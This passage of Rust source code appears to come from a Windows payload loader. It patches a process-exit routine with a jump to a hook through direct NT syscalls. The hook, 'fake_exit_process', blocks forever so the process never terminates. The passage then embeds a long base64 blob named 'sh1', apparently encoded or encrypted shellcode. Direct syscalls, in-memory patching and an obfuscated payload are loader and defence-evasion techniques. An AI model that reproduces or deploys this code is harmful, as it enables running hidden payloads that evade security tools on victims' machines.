                ((hook_addr >> 32) & 0xFF) as u8,
                ((hook_addr >> 40) & 0xFF) as u8,
                ((hook_addr >> 48) & 0xFF) as u8,
                ((hook_addr >> 56) & 0xFF) as u8,
                0xFF, 0xE0,
            ];

            let mut bytes_written = 0usize;
            asm_nt_write_virtual_memory(
                -1isize as windows_sys::Win32::Foundation::HANDLE,
                exit_proc_ptr as *mut std::ffi::c_void,
                patch.as_ptr() as *const std::ffi::c_void,
                patch.len(),
                &mut bytes_written,
                &nt_write_info,
            );

            asm_nt_protect_virtual_memory(
                -1isize as windows_sys::Win32::Foundation::HANDLE,
                &mut base_address,
                &mut region_size,
                old_protect,
                &mut old_protect,
                &nt_protect_info,
            );
        }
    }
}

unsafe extern "system" fn fake_exit_process(_exit_code: u32) {
    if let (Some(nt_create_event_info), Some(nt_wait_info)) = (
        get_syscall_info("ntdll.dll", "NtCreateEvent"),
        get_syscall_info("ntdll.dll", "NtWaitForSingleObject"),
    ) {
        let mut event_handle: windows_sys::Win32::Foundation::HANDLE = 0;
        asm_nt_create_event(
            &mut event_handle,
            0x1F0003, // EVENT_ALL_ACCESS
            std::ptr::null_mut(),
            1, // NotificationEvent
            0, // Not signaled
            &nt_create_event_info,
        );

        if event_handle != 0 {
            asm_nt_wait_for_single_object(
                event_handle,
                0,
                std::ptr::null_mut(), // INFINITE
                &nt_wait_info,
            );
        }
    }
    // Fallback: spin loop to prevent exit if syscalls fail
    loop { std::thread::sleep(std::time::Duration::from_secs(60)); }
}

const sh1: &str = "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